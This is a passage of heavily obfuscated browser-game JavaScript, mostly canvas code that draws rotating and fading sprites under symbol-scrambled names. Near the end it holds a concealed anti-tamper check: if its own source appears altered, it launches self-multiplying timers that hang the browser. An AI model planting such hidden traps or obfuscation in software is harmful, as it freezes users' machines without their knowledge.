				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ΔΔⵠ;
				var ⲆⵠⲆ = 0
			}
			Ⲇᐃᐃᐃ === this.info ? ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃ][ⲆⲆⲆ.time] : ᐃⵠ = ⵠⲆ[Ⲇ.Ⲇⵠⵠᐃᐃ][ⲆⲆⲆ.time][this.info - 1];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆΔΔⵠ + Δⵠ, -ᐃⵠ.height / ⲆⲆΔᐃ + ⲆⵠⲆ);
			Δ.restore()
		}

		function ⵠⲆⲆᐃΔⵠΔΔᐃ() {
			var ΔᐃᐃⵠⲆ = Math.PI / Ⲇᐃᐃⵠ;
			var ΔΔᐃⲆⲆⲆΔ = Math.PI / 4;
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.ⲆΔΔᐃΔΔⵠ.ⵠⲆᐃ();
			this.ᐃⲆᐃⵠΔⵠⵠ.ⵠⲆᐃ();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.info === ΔᐃΔΔ) ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃΔ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔᐃΔⵠⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ᐃⲆⵠᐃΔ, -ⵠⵠᐃ / ᐃⵠⲆⲆⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃⲆΔ && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆΔⲆⵠᐃⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⵠᐃⲆ, -ⵠⵠᐃ / ⲆΔΔⵠ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				if (this.ΔΔᐃⵠⵠ.ⵠⲆᐃ() && this.ΔΔᐃⵠⵠ.ᐃⲆΔ == false) this.action -= ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ;
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔⵠᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⲆΔΔⵠ, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ΔⵠⲆΔ
			}
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle + ΔΔᐃⲆⲆⲆΔ);
			Δ.translate(100, Ⲇᐃᐃᐃ);
			Δ.rotate(ΔᐃᐃⵠⲆ);
			if (this.info === ᐃⵠⲆ) ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔᐃⲆ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠⲆⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ⲆΔΔᐃΔΔⵠ.ΔᐃΔ;
			ⵠⵠᐃ = this.ⲆΔΔᐃΔΔⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / Ⲇⵠⵠᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆⵠᐃⲆᐃ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ΔⵠⵠΔ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ᐃᐃⵠ
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆΔᐃΔⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle + ΔᐃᐃⵠⲆ + ΔΔᐃⲆⲆⲆΔ);
			Δ.translate(100, 0);
			Δ.rotate(ΔᐃᐃⵠⲆ);
			if (this.info === 0) ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠᐃⵠ][ⲆⲆⲆ.time];
			else ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠⲆⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃⲆᐃⵠΔⵠⵠ.ΔᐃΔ;
			ⵠⵠᐃ = this.ᐃⲆᐃⵠΔⵠⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⵠᐃⲆ, -ⵠⵠᐃ / ⵠΔⲆᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃΔⲆⲆⵠΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ᐃΔᐃⲆ
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃᐃΔⵠΔⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ΔⲆᐃᐃ
			}
			Δ.restore()
		}

		function ⵠᐃΔⵠⵠⲆⵠ(ᐃΔ, ΔⲆᐃΔⵠⲆⲆ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ⲆΔᐃⲆΔ && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[ΔⲆᐃΔⵠⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ᐃⲆⵠᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ΔΔᐃⵠ
			}
			Δ.restore()
		}

		function ⲆᐃⲆΔⲆᐃΔᐃᐃ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * (600 * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ));
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = ⵠΔⲆⵠ;
				var ⲆⵠⲆ = 0
			}
			Δ.save();
			this.info & 255 && 65280 != (this.info & 65280) && (Δⵠ += Math.random() * 2 - 1, ⲆⵠⲆ += 2 * Math.random() - 1);
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃΔⲆⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⵠⵠΔⲆ, -ᐃⵠ.height / 2);
			this.info & 255 && 65280 != (this.info & 65280) && (this.rotate = (this.rotate + ᐃᐃⲆⲆ * ᐃⵠᐃᐃ) % (Ⲇⵠⵠᐃ * Math.PI));
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠΔⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⵠΔᐃᐃⵠ, -ᐃⵠ.height / ⵠⵠⵠΔ);
			Δ.restore()
		}

		function ⵠᐃᐃⲆⲆΔΔⵠⲆ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ᐃᐃΔᐃΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * (600 * ((ΔᐃᐃⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ));
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ⵠⵠⵠΔ);
			Δ.restore()
		}

		function ΔΔΔΔⵠΔⵠⵠⵠ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
			Δ.globalAlpha = .3;
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠΔⵠ][ⲆⲆⲆ.time];
			var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
			var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.globalAlpha = 1;
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false) this.Δᐃⵠ.ⵠⲆᐃ = false;
				var ΔᐃΔ = ᐃⵠᐃᐃ * (ΔⵠΔⵠ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * 600 * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ΔⲆⵠⲆ;
				var ⲆⵠⲆ = 0
			}
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Ⲇⵠⵠᐃ + Δⵠ, -ᐃⵠ.height / ⵠⲆⵠⲆ + ⲆⵠⲆ);
			Δ.restore()
		}

		function ⵠⲆⲆᐃᐃᐃΔⲆᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ⲆΔⲆᐃΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = ΔᐃᐃⲆⲆ;
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (10 === this.info || ⲆΔⲆⲆ === 0) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆᐃⲆᐃᐃⵠ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃⲆΔ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / Δⵠⵠⵠ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠΔᐃΔᐃⲆ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠᐃΔΔ][ⲆⲆⲆ.time];
				Δ.translate(ⵠⲆᐃⵠ, ᐃⵠ.height / 2);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / 2, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ⲆⲆᐃⵠΔᐃΔΔᐃ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				var ΔᐃΔ = (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = ᐃⵠⲆⵠ
			}
			if (this.info & 255 && 65280 != (this.info & 65280)) this.rotate = (this.rotate + ᐃⵠᐃᐃ * .5) % (ᐃⲆΔⲆ * Math.PI);
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.save();
			Δ.rotate(this.rotate);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⲆΔⲆⲆⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ΔⵠⵠΔ, -ᐃⵠ.height / ⵠⲆⵠⲆ);
			Δ.restore();
			Δ.save();
			Δ.rotate(this.ⲆⲆⲆΔⵠᐃᐃΔⲆ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆΔⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			Δ.restore();
			Δ.restore()
		}

		function ⵠΔΔΔᐃⲆᐃⲆⲆ() {
			var ᐃⵠ = ⲆΔᐃᐃᐃ;
			var ⲆᐃΔⵠᐃⵠⵠ = ⲆⲆⲆⲆᐃ;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			if (.1 <= this.ᐃⲆⲆⲆⵠ && this.ᐃⲆⲆⲆⵠ <= 1.1) {
				var ᐃΔΔᐃ = Math.max(0, Math.min(1, this.ᐃⲆⲆⲆⵠ - .1));
				if (ᐃΔΔᐃ < .2) ᐃΔΔᐃ *= ⵠⵠΔⵠ;
				else ᐃΔΔᐃ > .8 ? ᐃΔΔᐃ = ⵠᐃΔⲆ * (1 - ᐃΔΔᐃ) : ᐃΔΔᐃ = ΔⲆᐃᐃ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠΔⲆⲆᐃ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.width;
				ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
				Δ.globalAlpha = ᐃΔΔᐃ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				var ⲆᐃΔⵠᐃⵠⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⲆᐃΔⲆ]
			}
			if (this.ᐃⲆⲆⲆⵠ >= .9) {
				var ᐃΔΔᐃ = Math.max(0, Math.min(1, this.ᐃⲆⲆⲆⵠ - .9));
				ᐃΔΔᐃ < .2 ? ᐃΔΔᐃ *= 5 : ᐃΔΔᐃ = 1;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆᐃⵠ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
				ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ;
				Δ.globalAlpha = ᐃΔΔᐃ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / ΔᐃⵠⵠⲆ, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				var ⲆᐃΔⵠᐃⵠⵠ = ⵠⲆ[Ⲇ.ᐃΔΔᐃΔⲆⲆ]
			}
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ && ⲆᐃΔⵠᐃⵠⵠ !== ΔΔⵠᐃΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ΔΔⵠⲆΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = ᐃΔΔᐃ * (.6 - this.Δᐃⵠ.ΔᐃΔ);
				ᐃⵠⵠ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ⲆᐃΔⵠᐃⵠⵠ.width;
				ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ⲆᐃΔⵠᐃⵠⵠ.height;
				ΔⲆΔⵠ(Δ, ⲆᐃΔⵠᐃⵠⵠ, -ᐃⵠⵠ / ΔⲆᐃⵠᐃ, -ⵠⵠᐃ / 4, ᐃⵠⵠ / Δⵠⵠⵠ, ⵠⵠᐃ / Ⲇⵠⵠᐃ)
			}
			Δ.globalAlpha = ΔⲆⵠ;
			Δ.restore()
		}

		function ᐃΔⵠᐃΔⵠⵠΔⲆ() {
			if (this.info === 10) return;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false && (this.Δᐃⵠ.ⵠⲆᐃ = ⵠΔⲆⲆⲆ);
				var ΔᐃΔ = ᐃ * ((ΔⲆᐃᐃ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600);
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = ΔⲆⲆ;
				var ⲆⵠⲆ = ᐃⵠⲆⵠ
			}
			if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠⲆⵠΔΔⲆ][ⲆⲆⲆ.time];
			else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔᐃᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2 + Δⵠ, -ᐃⵠ.width / Δᐃⵠⵠ + ⲆⵠⲆ);
			Δ.restore();
			var ⲆΔⲆⲆ = this.info & 15;
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ⲆΔⲆⲆ; ⵠᐃ++) this.ᐃΔᐃⵠ[ⵠᐃ].ΔᐃΔⵠ(Ⲇ.ⲆⲆΔΔᐃ)
		}

		function ΔΔⵠⵠⵠⵠΔΔⲆ() {
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ᐃⵠΔⵠⲆ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = ᐃⵠⵠᐃΔ);
				var ΔᐃΔ = ᐃ * (600 * ((ΔΔΔ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ));
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = Δᐃᐃᐃ
			}
			this.ⲆⵠⲆⲆΔᐃΔ = (this.ⲆⵠⲆⲆΔᐃΔ + ⵠᐃⵠⲆ * ᐃⵠᐃᐃ) % (Math.PI * 2);
			this.ⵠᐃᐃⵠΔΔⵠ = (this.ⵠᐃᐃⵠΔΔⵠ - 3 * ᐃⵠᐃᐃ) % (2 * Math.PI);
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + this.y + ⲆⵠⲆ);
			Δ.save();
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⵠ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Δⵠⵠⵠ, -ᐃⵠ.height / ⵠΔⲆᐃ);
			Δ.restore();
			Δ.save();
			Δ.rotate(this.ⲆⵠⲆⲆΔᐃΔ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠᐃΔⲆᐃⲆ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			Δ.restore();
			Δ.save();
			Δ.rotate(this.ⵠᐃᐃⵠΔΔⵠ);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔΔΔ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ⲆΔΔⵠ);
			Δ.restore();
			Δ.restore()
		}

		function ⲆΔⲆⲆⵠⲆⲆⲆᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ΔⲆΔⲆⵠ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⵠⲆⵠᐃⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.ΔⲆΔⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
			ⵠⵠᐃ = this.ΔⲆΔⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠΔⲆᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}
		const ⵠΔᐃΔⲆΔᐃᐃΔ = "";

		function ⲆᐃᐃⲆΔⵠᐃ(ⲆⵠᐃΔⲆⲆⲆᐃⵠ) {
			if (ⲆⵠᐃΔⲆⲆⲆᐃⵠ > 0) return ⲆⵠᐃΔⲆⲆⲆᐃⵠ * ⲆⵠᐃΔⲆⲆⲆᐃⵠ;
			else return ⲆⵠᐃΔⲆⲆⲆᐃⵠ
		}

		function ᐃⵠᐃⵠᐃΔⵠ(ⵠⵠΔⲆⲆⵠⲆ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ⵠⵠΔⲆⲆⵠⲆ)
		}

		function ⲆⲆⵠⲆΔⵠΔᐃⵠ(ⲆᐃⲆⲆΔΔⵠᐃᐃ) {
			return ⲆᐃⲆⲆΔΔⵠᐃᐃ.map(ᐃⵠᐃⵠᐃΔⵠ).join(ⵠΔᐃΔⲆΔᐃᐃΔ)
		}

		function ⲆⲆΔⲆᐃⲆⵠ(ⵠⵠⵠⲆⵠΔⲆ) {
			const ᐃⵠᐃⵠᐃΔⲆ = ⲆᐃᐃⲆΔⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[31]]();
			const ΔᐃⵠⲆᐃⵠΔ = ᐃⵠᐃⵠᐃΔⲆ.indexOf(ⵠⵠⵠⲆⵠΔⲆ);
			return ΔᐃⵠⲆᐃⵠΔ !== -1 ? 1 : 0
		}
		const ᐃᐃⵠᐃΔᐃΔᐃᐃ = ⲆⲆΔⲆᐃⲆⵠ(ⲆⲆⵠⲆΔⵠΔᐃⵠ([11398, 5123, 5123, 11398, 916, 11616, 5123]));
		if (ᐃᐃⵠᐃΔᐃΔᐃᐃ === 0) {
			const ᐃᐃⵠᐃΔᐃΔᐃᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]];
			const ΔᐃⵠⲆᐃⵠΔ = ᐃᐃⵠᐃΔᐃΔᐃᐃ;
			const ⲆᐃᐃⲆΔⵠᐃ = function() {
				ᐃᐃⵠᐃΔᐃΔᐃᐃ(ⲆᐃᐃⲆΔⵠᐃ, 1260);
				ΔᐃⵠⲆᐃⵠΔ(ⲆᐃᐃⲆΔⵠᐃ, 8370)
			};
			ⲆᐃᐃⲆΔⵠᐃ()
		}

		function ᐃᐃⲆⲆⵠⲆⵠⲆⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ΔΔⲆⲆⲆΔᐃ = Math.min(1, this.ΔΔⲆⲆⲆΔᐃ + 2 * ᐃⵠᐃᐃ);
